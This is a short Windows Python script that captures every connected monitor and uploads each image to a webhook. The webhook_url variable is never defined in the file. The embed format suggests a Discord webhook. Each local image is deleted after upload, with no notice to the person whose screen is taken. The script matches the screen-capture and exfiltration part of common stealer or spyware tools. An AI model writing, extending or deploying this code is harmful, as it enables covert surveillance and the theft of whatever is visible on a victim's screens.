import requests
import os
from PIL import Image
from screeninfo import get_monitors
import win32gui
import win32ui
import win32con
def capture_screenshot(monitor):
    hwin = win32gui.GetDesktopWindow()
    width = monitor.width
    height = monitor.height
    left = monitor.x
    top = monitor.y
    hwindc = win32gui.GetWindowDC(hwin)
    srcdc = win32ui.CreateDCFromHandle(hwindc)
    memdc = srcdc.CreateCompatibleDC()
    bmp = win32ui.CreateBitmap()
    bmp.CreateCompatibleBitmap(srcdc, width, height)
    memdc.SelectObject(bmp)
    memdc.BitBlt((0, 0), (width, height), srcdc, (left, top), win32con.SRCCOPY)
    bmpinfo = bmp.GetInfo()
    bmpstr = bmp.GetBitmapBits(True)
    img = Image.frombuffer(
        'RGB',
        (bmpinfo['bmWidth'], bmpinfo['bmHeight']),
        bmpstr, 'raw', 'BGRX', 0, 1)
    memdc.DeleteDC()
    win32gui.DeleteObject(bmp.GetHandle())
    srcdc.DeleteDC()
    win32gui.ReleaseDC(hwin, hwindc)
    return img
def capture_screenshots():
    file_paths = []
    monitors = get_monitors()
    for i, monitor in enumerate(monitors, start=1):
        screenshot = capture_screenshot(monitor)
        filename = f'screenshot_screen_{i}.png'
        screenshot.save(filename)
        file_paths.append(filename)
        send_screenshot_to_webhook(filename)
        if os.path.exists(filename):
            os.remove(filename)
    return file_paths
def send_screenshot_to_webhook(filename):
    with open(filename, 'rb') as f:
        response = requests.post(
            webhook_url,
            files={"file": (filename, f, 'image/png')},
            data={"payload_json": '{"embeds": [{"color": 9109504, "image": {"url": "attachment://' + filename + '"}}]}'}
        )
        response.raise_for_status()
def main():
    capture_screenshots()
if __name__ == "__main__":
    main()
